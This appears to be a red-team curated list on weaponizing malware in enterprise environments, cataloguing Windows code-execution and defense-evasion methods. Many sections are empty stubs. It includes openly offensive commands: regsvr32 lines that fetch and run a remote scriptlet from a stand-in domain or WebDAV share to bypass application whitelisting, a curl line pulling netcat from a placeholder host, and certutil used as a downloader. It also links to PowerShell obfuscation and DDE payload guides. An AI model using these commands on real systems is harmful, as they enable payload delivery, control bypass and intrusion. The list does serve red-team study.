# Malware Weaponization & Development
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments. 

## Code Execution Methods
### Powershell
Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment
  * [Infoke-Obfuscation Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide): Infamous Powershell obfuscator by Daniel Bohannon
  * 

### Dynamic Data Exchange (DDE)
Macroless payload in Word and Excel
  * Frequently blocked in Word docs within modern Enterprises but not always within Excel files. 
  * [DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd): Various delivery methods on Medium blog from 2018 to create DDE paylods in different tool kits
  
### Mshta (HTA)
Microsoft binary to execute HTA files or inline scripts
  
### Rundll32

### MsBuild
Windows .NET executable for building Csharp project files

### Regsvr32
Windows command-line tool to register and unregister dll files. Can be used to bypass some controls such as AppLocker
  * [Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)](https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/)

Method 1: Web server delivery
Written on disk in IE local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:http://yourdomain/payload.sct scrobj.dll
```
Method 2: WebDAV server
Written on disk in WebDAV client local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:\\webdavserver\tmp\payload.sct scrobj.dll
```

### SLK (Symbolic Link) 

### IQY file / Excel with IQY embedded

### Malicious DLL (Csharp)
Create a custom made Csharp DLL in Visual Studio Code for more custom/granular payloads to bypass AV

### Powershell

### Curl
Linux and Windows 10 (build #17063 and later) operating systems tool to bypass controls
Reference: https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983
```
curl -o nc.exe https://yourdomain.com/nc.exe
```

### Certutil
Windows built-in binary for downloading remote files, encoding and decoding them
```
certutil -urlcache -f https://download.sysinternals.com/files/PSTools.env pstools.env
certutil -decode pstools.env pstools.zip
```

### MsBuild with WebDAV

### Bitsadmin
Windows command-line utility
